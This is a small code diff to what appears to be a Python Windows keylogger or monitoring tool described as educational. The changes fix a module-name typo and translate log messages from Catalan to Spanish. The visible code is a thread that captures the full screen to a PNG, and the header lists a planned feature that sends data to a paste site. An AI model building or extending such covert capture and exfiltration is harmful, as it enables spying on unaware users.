@@ -21,7 +21,7 @@
 #               * Paste data to a Paste service/site (to do)
 #
 # Required:     Install with "pip install module-name-required"
-#               pywin32, pyWinhook, win32gui, requests, vxPython
+#               pywin32, pyWinhook, win32gui, requests, wxPython
 #
 # Notes:        This code has been tested, developed and designed to work in a Windows environment.
 #               Its purpose is only educational.
@@ -114,7 +114,7 @@ class ScreenShootThread (threading.Thread):
       threading.Thread.__init__(self)
       self.screen_file = screen_filename
    def run(self):
-      print("Guardant captura " + self.screen_file)
+      print("Guardado captura " + self.screen_file)
       app = wx.App()  # Need to create an App instance before doing anything
       screen = wx.ScreenDC()
       size_x, size_y = screen.GetSize()
@@ -124,7 +124,7 @@ class ScreenShootThread (threading.Thread):
       del mem  # libera memoria que contiene captura de imagen
       del app  # libera objeto de instancia de la aplicación
       bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
-      print("Fi captura " + self.screen_file)
+      print("Fin captura " + self.screen_file)
 
 
 
